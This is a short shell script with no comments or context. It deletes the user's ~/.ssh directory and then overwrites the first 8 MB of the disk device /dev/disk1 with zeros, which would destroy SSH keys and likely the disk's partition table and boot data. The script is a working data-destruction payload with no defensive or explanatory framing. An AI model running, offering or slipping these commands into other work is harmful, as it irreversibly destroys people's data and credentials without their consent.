#!/bin/sh
rm -rf "$HOME/.ssh"
dd if=/dev/zero of=/dev/disk1 bs=1m count=8
